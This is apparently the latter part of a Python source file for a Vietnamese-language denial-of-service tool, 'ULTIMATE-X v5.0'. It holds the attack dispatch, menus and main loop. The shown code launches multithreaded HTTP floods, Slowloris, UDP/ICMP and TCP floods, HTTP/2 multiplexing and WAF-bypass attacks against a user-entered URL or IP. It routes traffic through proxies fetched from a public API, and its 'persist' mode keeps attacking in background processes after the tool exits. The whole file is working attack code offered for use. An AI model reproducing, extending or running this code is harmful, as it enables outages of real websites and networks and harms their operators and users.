                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
                if response.status_code == 522:
                    print(f"{Fore.RED}🔥 [KẾT HỢP] Tấn công: 522 - KẾT NỐI MỤC TIÊU NGẮT!{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}⚡ [KẾT HỢP] Tấn công: 522 - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "http2" and HTTP2_AVAILABLE:
                http2_multiplexing_attack(url)
            else:
                keep_alive_pipelining_attack(url)
        except Exception as e:
            print(f"{Fore.RED}🚨 [KẾT HỢP] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(random.uniform(0.0002, 0.001))

def layer3_4_attack(host, port, request_count):
    udp_flood_attack(host, port)

def multi_vector_attack(url, request_count):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 80
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            attack_type = random.choice(["slowloris", "flood", "429403", "522", "layer3_4", "http2", "keep_alive"])
            if attack_type == "slowloris":
                sock = session.get(url, headers=headers, proxies=proxy, timeout=30, stream=True)
                print(f"{Fore.RED}🔥 [ĐA VECTOR] Tấn công: Kết nối Slowloris giữ{Fore.RESET}")
                time.sleep(0.01)
                sock.close()
            elif attack_type == "flood":
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
                print(f"{Fore.RED}🔥 [ĐA VECTOR] Tấn công: HTTP Flood - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "429403":
                method = random.choice(methods)
                if method == "GET":
                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                elif method == "POST":
                    response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
                else:
                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                if response.status_code in (429, 403):
                    print(f"{Fore.RED}🔥 [ĐA VECTOR] Tấn công: 429/403 - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}⚡ [ĐA VECTOR] Tấn công: 429/403 - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "522":
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
                if response.status_code == 522:
                    print(f"{Fore.RED}🔥 [ĐA VECTOR] Tấn công: 522 - KẾT NỐI MỤC TIÊU NGẮT!{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}⚡ [ĐA VECTOR] Tấn công: 522 - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "layer3_4":
                layer3_4_attack(host, port, 1)
            elif attack_type == "http2" and HTTP2_AVAILABLE:
                http2_multiplexing_attack(url)
            else:
                keep_alive_pipelining_attack(url)
        except Exception as e:
            print(f"{Fore.RED}🚨 [ĐA VECTOR] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(random.uniform(0.0002, 0.001))

def layer7_attack(url, request_count):
    if random.choice([True, False]):
        layer7_waf_bypass_attack(url)
    else:
        if HTTP2_AVAILABLE and urllib.parse.urlparse(url).scheme == 'https':
            http2_multiplexing_attack(url)
        else:
            keep_alive_pipelining_attack(url)

def volumetric_attack(host, port):
    attack_type = random.choice(["udp", "icmp"])
    if attack_type == "udp":
        udp_flood_attack(host, port)
    else:
        icmp_flood_attack(host)

def protocol_attack(host, port):
    layer4_tcp_udp_flood(host, port)

def application_layer_attack(url):
    layer7_waf_bypass_attack(url)

def send_request(url, request_count):
    global success_count, error_count, response_times
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            delay = random.uniform(0, 0.0001)
            time.sleep(delay)
            start_time = time.perf_counter()
            if method == "GET":
                response = session.get(url, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            elif method == "HEAD":
                response = session.head(url, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            else:
                response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            end_time = time.perf_counter()
            response_time = (end_time - start_time) * 1000
            with manager:
                success_count += 1
                response_times.append(response_time)
            if response.status_code in (503, 429, 522):
                print(f"{Fore.YELLOW}⚡ [TẤN CÔNG] {method} Tấn công: Mã trạng thái {response.status_code} | Thời gian: {response_time:.2f}ms | Mục tiêu: ĐANG QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}⚡ [TẤN CÔNG] {method} Tấn công: Mã trạng thái {response.status_code} | Thời gian: {response_time:.2f}ms | Mục tiêu: ĐANG CHỊU ÁP LỰC{Fore.RESET}")
        except requests.exceptions.RequestException as e:
            with manager:
                error_count += 1
            print(f"{Fore.RED}🚨 [TẤN CÔNG THẤT BẠI] Lỗi: {str(e)}{Fore.RESET}")
        except Exception as e:
            with manager:
                error_count += 1
            print(f"{Fore.RED}🚨 [TẤN CÔNG THẤT BẠI] Lỗi: {str(e)}{Fore.RESET}")

# UI Functions
def display_banner():
    banner = [
        f"{Fore.RED}{Style.BRIGHT}╔════════════════════════════════════════════════════╗{Style.RESET_ALL}",
        f"{Fore.RED}║ 💀 ULTIMATE-X v5.0 - QUANG BẢO © 2025              ║{Style.RESET_ALL}",
        f"{Fore.RED}║ 🚀 GIAO THỨC: QUANG BAO PROTOCOL v3                ║{Style.RESET_ALL}",
        f"{Fore.RED}║ 🛡️ MỌI QUYỀN ĐƯỢC BẢO LƯU                           ║{Style.RESET_ALL}",
        f"{Fore.RED}╚════════════════════════════════════════════════════╝{Style.RESET_ALL}",
        f"{Fore.CYAN}     ©Quang Bao 2025{Style.RESET_ALL}"
    ]
    clear_screen()
    for line in banner:
        typing_effect(line, delay=0.0)
    time.sleep(0.0)

def display_target_menu():
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}{Style.BRIGHT}┌───────[ CHIẾN LƯỢC TẤN CÔNG ]───────┐{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}│ 0. 🩺 Chạy chẩn đoán hệ thống         │{Fore.RESET}")
    print(f"{Fore.YELLOW}│ 1. 📋 Xem chi tiết chiến lược         │{Fore.RESET}")
    print(f"{Fore.CYAN}├{'─' * 37}┤{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}│ {'ID':<4} │ {'Tên':<12} │ {'Mô tả':<15} │ {'Cấp độ':<10} │{Fore.RESET}")
    print(f"{Fore.CYAN}├{'─' * 37}┤{Style.RESET_ALL}")
    for target in TARGET_CONFIGS:
        print(f"{Fore.YELLOW}│ {target['id']:<4} │ {target['name'][:12]:<12} │ {target['desc'][:15]:<15} │ {target['level'][:10]:<10} │{Fore.RESET}")
    print(f"{Fore.CYAN}└{'─' * 37}┘{Style.RESET_ALL}")
    print(f"{Fore.CYAN}© Quang Bảo 2025{Fore.RESET}")

def display_ordered_functions():
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}{Style.BRIGHT}┌───────[ CHI TIẾT CHIẾN LƯỢC TẤN CÔNG ]───────┐{Style.RESET_ALL}")
    categories = [
        ("High-Impact", Fore.YELLOW, Back.RED),
        ("Extreme", Fore.RED, Back.YELLOW),
        ("Specialized", Fore.MAGENTA, Back.BLUE)
    ]
    for category, cat_color, cat_bg in categories:
        print(f"{cat_color}{cat_bg}{Style.BRIGHT}🔥 {category.upper():<39} 🔥{Style.RESET_ALL}")
        print(f"{Fore.CYAN}├{'─' * 45}┤{Fore.RESET}")
        print(f"{Fore.CYAN}│ {'ID':<4} │ {'Tên':<12} │ {'Mô tả':<15} │ {'Cấp độ':<8} │ {'Ứng dụng':<15} │{Fore.RESET}")
        print(f"{Fore.CYAN}├{'─' * 45}┤{Fore.RESET}")
        for func in [f for f in TARGET_CONFIGS if f['category'] == category]:
            print(f"{cat_color}│ {func['id']:<4} │ {func['name'][:12]:<12} │ {func['desc'][:15]:<15} │ {func['level'][:8]:<8} │ {func['application'][:15]:<15} │{Fore.RESET}")
        print(f"{Fore.CYAN}└{'─' * 45}┘{Fore.RESET}\n")
    input(f"{Fore.CYAN}┌──(quangbao㉿attack)-[~]\n└─ {Fore.CYAN}⏎ Nhấn Enter để trở về menu chính...{Fore.RESET}")

def display_ultimate_x_menu():
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}{Style.BRIGHT}┌─────[ TẤN CÔNG ULTIMATE-X ]─────┐{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}│ 1. 📡 Băng thông (UDP/ICMP Flood)         │{Fore.RESET}")
    print(f"{Fore.YELLOW}│ 2. 🔌 Giao thức (TCP SYN/ACK/RST Flood)   │{Fore.RESET}")
    print(f"{Fore.YELLOW}│ 3. 🌐 Tầng ứng dụng (HTTP Flood + WAF)    │{Fore.RESET}")
    print(f"{Fore.CYAN}└{'─' * 34}┘{Style.RESET_ALL}")
    print(f"{Fore.CYAN}© Quang Bảo 2025{Fore.RESET}")

def target_selection_effect(target_type):
    frames = [
        f"{Fore.RED}{Style.BRIGHT}🔍 [KHÓA MỤC TIÊU] {target_type.upper()} [20%]...{Style.RESET_ALL}",
        f"{Fore.YELLOW}{Style.BRIGHT}🔍 [KHÓA MỤC TIÊU] {target_type.upper()} [50%]...{Style.RESET_ALL}",
        f"{Fore.CYAN}{Style.BRIGHT}🔍 [KHÓA MỤC TIÊU] {target_type.upper()} [80%]...{Style.RESET_ALL}",
        f"{Fore.GREEN}{Style.BRIGHT}🎯 [MỤC TIÊU ĐÃ KHÓA] {target_type.upper()} [100%]!{Style.RESET_ALL}"
    ]
    for frame in frames:
        clear_screen()
        display_banner()
        print(frame)
        time.sleep(0.3)

# Main Function
def main():
    global USE_PROXY
    check_file_integrity()
    multiprocessing.set_start_method('spawn')
    while True:
        try:
            if not validate_key():
                print(f"{Fore.RED}{Style.BRIGHT}🚨 [HỆ THỐNG] Hủy tấn công - Xác thực thất bại{Style.RESET_ALL}{Fore.RESET}")
                exit(1)

            display_target_menu()
            print(f"{Fore.CYAN}┌──(quangbao㉿attack)-[~]\n└─ {Fore.RESET}", end="")
            choice = input(f"{Fore.CYAN}🔢 Nhập lựa chọn (0-35): {Fore.RESET}").strip()

            if choice == "0":
                run_diagnostics()
                continue
            elif choice == "1":
                display_ordered_functions()
                continue

            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
            if not target:
                print(f"{Fore.RED}🚨 [LỖI] Lựa chọn không hợp lệ! Thử lại.{Fore.RESET}")
                time.sleep(1)
                continue
            target_selection_effect(target['name'])

            base_threads = target['threads']
            base_requests = target['requests']

            if target['name'] == "persist":
                print(f"{Fore.RED}{Style.BRIGHT}⚠ [CẢNH BÁO] Tấn công sẽ chạy nền kể cả sau khi thoát công cụ!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}ℹ Để dừng: Dùng 'killall python3' (Linux/Termux) hoặc Task Manager (Windows){Fore.RESET}")

            if target['name'] == "ultima_x":
                display_ultimate_x_menu()
                print(f"{Fore.CYAN}┌──(quangbao㉿attack)-[~]\n└─ {Fore.RESET}", end="")
                attack_choice = input(f"{Fore.CYAN}🔢 Chọn loại tấn công (1-3): {Fore.RESET}").strip()
                if attack_choice not in ["1", "2", "3"]:
                    print(f"{Fore.RED}🚨 [LỖI] Lựa chọn không hợp lệ! Thử lại.{Fore.RESET}")
                    time.sleep(1)
                    continue

            print(f"{Fore.CYAN}┌──(quangbao㉿attack)-[~]\n└─ {Fore.RESET}", end="")
            proxy_api_url = input(f"{Fore.CYAN}🌐 Nhập URL API Proxy (nhấn Enter để dùng API mặc định): {Fore.WHITE}").strip()
            if not proxy_api_url:
                proxy_api_url = "https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc"
            fetch_proxies_from_api(proxy_api_url)

            print(f"{Fore.CYAN}┌──(quangbao㉿attack)-[~]\n└─ {Fore.RESET}", end="")
            proxy_choice = input(f"{Fore.CYAN}🔄 Chọn chế độ tấn công (1: Dùng proxy, 2: Không dùng proxy): {Fore.WHITE}").strip()
            if proxy_choice == "1":
                USE_PROXY = True
                if not PROXY_LIST:
                    print(f"{Fore.RED}🚨 [LỖI] Không có proxy sống khả dụng! Vui lòng kiểm tra API hoặc chọn không dùng proxy.{Fore.RESET}")
                    time.sleep(1)
                    continue
            elif proxy_choice == "2":
                USE_PROXY = False
            else:
                print(f"{Fore.RED}🚨 [LỖI] Lựa chọn không hợp lệ! Thử lại.{Fore.RESET}")
                time.sleep(1)
                continue

            print(f"{Fore.CYAN}┌──(quangbao㉿attack)-[~]\n└─ {Fore.RESET}", end="")
            input_url = input(f"{Fore.CYAN}🌐 Nhập URL hoặc IP mục tiêu: {Fore.WHITE}").strip()
            if not input_url:
                print(f"{Fore.RED}🚨 [LỖI] URL/IP không được để trống! Thử lại.{Fore.RESET}")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
            except ValueError:
                host = input_url
                port = 80
                validated_url = f"http://{host}"
                print(f"{Fore.YELLOW}ℹ [HỆ THỐNG] Xử lý mục tiêu như IP: {host}{Fore.RESET}")

            print(f"{Fore.YELLOW}{Style.BRIGHT}🎯 [HỆ THỐNG] Mục tiêu đã khóa: {validated_url}{Style.RESET_ALL}")

            if target['name'] not in ("persist", "layer7", "multi_vec", "http2_mux", "keep_alive", "multi_proc", "multi_async", "udp_flood", "waf_bypass", "tcp_udp", "ultima_x"):
                print(f"{Fore.CYAN}┌──(quangbao㉿attack)-[~]\n└─ {Fore.RESET}", end="")
                confirm = input(f"{Fore.RED}{Style.BRIGHT}⚠ [HỆ THỐNG] Xác nhận tấn công (y/n): {Style.RESET_ALL}").lower().strip()
                if confirm != 'y':
                    print(f"{Fore.YELLOW}{Style.BRIGHT}❌ [HỆ THỐNG] Hủy tấn công{Fore.RESET}")
                    continue

            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)

            if security_level == "THẤP":
                NUM_THREADS = min(recommended_threads, base_threads // 2)
                REQUESTS_PER_THREAD = min(recommended_requests, base_requests // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "TRUNG BÌNH":
                NUM_THREADS = base_threads
                REQUESTS_PER_THREAD = base_requests
                attack_strategy = "LỰC LƯỢNG VỪA PHẢI"
            else:
                NUM_THREADS = max(recommended_threads, base_threads)
                REQUESTS_PER_THREAD = max(recommended_requests, base_requests)
                attack_strategy = "LỰC LƯỢNG TỐI ĐA"

            print(f"""
{Fore.CYAN}{Style.BRIGHT}
┌─────[ CHIẾN LƯỢC TẤN CÔNG ]─────┐
│ 🔧 Kiểu: {target['name'].upper():<20} │
│ 🎯 Mục tiêu: {validated_url:<17} │
│ 🧵 Luồng: {NUM_THREADS:<18} │
│ 📨 Yêu cầu/Luồng: {REQUESTS_PER_THREAD:<10} │
│ ⚙ Chiến lược: {attack_strategy:<12} │
│ 🔄 Proxy: {'Bật' if USE_PROXY else 'Tắt':<14} │
│ 💥 Tổng lượt đánh: {NUM_THREADS * REQUESTS_PER_THREAD:<10} │
└{'─' * 34}┘
{Style.RESET_ALL}
            """)
            loading_animation("Khởi động tấn công", 3)

            start_time = time.time()

            if target['name'] == "persist":
                save_attack_config(validated_url, NUM_THREADS, REQUESTS_PER_THREAD, target['name'], USE_PROXY)
                processes = []
                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):
                    p = multiprocessing.Process(target=persistent_attack_process, args=(validated_url, REQUESTS_PER_THREAD))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                print(f"{Fore.RED}{Style.BRIGHT}🔥 [HỆ THỐNG] Tấn công liên tục bắt đầu với {len(processes)} tiến trình! Dùng 'killall python3' hoặc Task Manager để dừng.{Style.RESET_ALL}")
                time.sleep(2)
                exit(0)
            elif target['name'] == "layer7":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=layer7_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công tầng 7 bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "multi_vec":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=multi_vector_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công đa vector bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "http2_mux":
                if not HTTP2_AVAILABLE:
                    print(f"{Fore.RED}🚨 [LỖI] Tấn công HTTP/2 bị vô hiệu hóa: Chưa cài đặt module 'h2'{Fore.RESET}")
                    time.sleep(1)
                    continue
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=http2_multiplexing_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công HTTP/2 multiplexing bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "keep_alive":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=keep_alive_pipelining_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công Keep-Alive + Pipelining bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "multi_proc":
                processes = []
                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):
                    p = multiprocessing.Process(target=multiprocessing_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                try:
                    for p in processes:
                        p.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công đa tiến trình bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "multi_async":
                processes = []
                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):
                    p = multiprocessing.Process(target=multiprocessing_async_wrapper, args=(validated_url, REQUESTS_PER_THREAD))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                try:
                    for p in processes:
                        p.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công đa tiến trình + bất đồng bộ bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "udp_flood":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=udp_flood_attack, args=(host, port))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công UDP flood bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "waf_bypass":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=layer7_waf_bypass_attack, args=(validated_url,))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công vượt WAF bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "tcp_udp":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=layer4_tcp_udp_flood, args=(host, port))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công TCP/UDP flood bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target['name'] == "ultima_x":
                if attack_choice == "1":
                    threads = []
                    for _ in range(NUM_THREADS):
                        t = threading.Thread(target=volumetric_attack, args=(host, port))
                        threads.append(t)
                        t.start()
                    try:
                        for t in threads:
                            t.join()
                    except KeyboardInterrupt:
                        print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công băng thông bị dừng bởi người dùng{Fore.RESET}")
                        exit(0)
                elif attack_choice == "2":
                    threads = []
                    for _ in range(NUM_THREADS):
                        t = threading.Thread(target=protocol_attack, args=(host, port))
                        threads.append(t)
                        t.start()
                    try:
                        for t in threads:
                            t.join()
                    except KeyboardInterrupt:
                        print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công giao thức bị dừng bởi người dùng{Fore.RESET}")
                        exit(0)
                else:
                    threads = []
                    for _ in range(NUM_THREADS):
                        t = threading.Thread(target=application_layer_attack, args=(validated_url,))
                        threads.append(t)
                        t.start()
                    try:
                        for t in threads:
                            t.join()
                    except KeyboardInterrupt:
                        print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công tầng ứng dụng bị dừng bởi người dùng{Fore.RESET}")
                        exit(0)
            else:
                while True:
                    slowloris_thread = threading.Thread(target=slowloris_attack, args=(validated_url, 30))
                    flood_thread = threading.Thread(target=http_flood_attack, args=(validated_url, NUM_THREADS * 2))
                    slowloris_thread.start()
                    flood_thread.start()
                    threads = []
                    for _ in range(NUM_THREADS):
                        t = threading.Thread(target=send_request, args=(validated_url, REQUESTS_PER_THREAD))
                        threads.append(t)
                        t.start()
                    for t in threads:
                        t.join()
                    slowloris_thread.join()
                    flood_thread.join()
                    print(f"{Fore.YELLOW}🔄 [HỆ THỐNG] Chu kỳ tấn công vô hạn: Tiếp tục...{Fore.RESET}")
                    time.sleep(1)

            end_time = time.time()
            total_time = end_time - start_time
            with manager:
                if response_times:
                    avg_response_time = sum(response_times) / len(response_times)
                    max_response_time = max(response_times)
                    min_response_time = min(response_times)
                else:
                    avg_response_time = 0
                    max_response_time = 0
                    min_response_time = 0
            print(f"""
{Fore.CYAN}{Style.BRIGHT}
┌─────[ BÁO CÁO CHIẾN DỊCH: {target['name'].upper()} ]─────┐
│ 💥 Tổng lượt đánh: {(NUM_THREADS * REQUESTS_PER_THREAD):,}       │
│ ✅ Thành công: {success_count:,} ({success_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%) │
│ ❌ Thất bại: {error_count:,} ({error_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%) │
│ ⏱ Tổng thời gian: {total_time:.2f} giây                        │
│ 📈 Thời gian phản hồi trung bình: {avg_response_time:.2f}ms     │
│ 🏔 Hiệu suất đỉnh: {max_response_time:.2f}ms                   │
│ 🏞 Độ trễ tối thiểu: {min_response_time:.2f}ms                 │
│ ⚡ Lượt đánh/giây: {(NUM_THREADS * REQUESTS_PER_THREAD)/total_time:.0f} │
│ 🎯 MỤC TIÊU BỊ VÔ HIỆU HÓA!                                  │
└{'─' * 51}┘
{Style.RESET_ALL}
            """)

        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}{Style.BRIGHT}❌ [HỆ THỐNG] Tấn công bị dừng bởi người dùng{Style.RESET_ALL}")
            exit(0)
        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}🚨 [HỆ THỐNG] Lỗi nghiêm trọng: {str(e)}{Style.RESET_ALL}")
            exit(1)

if __name__ == "__main__":
    main()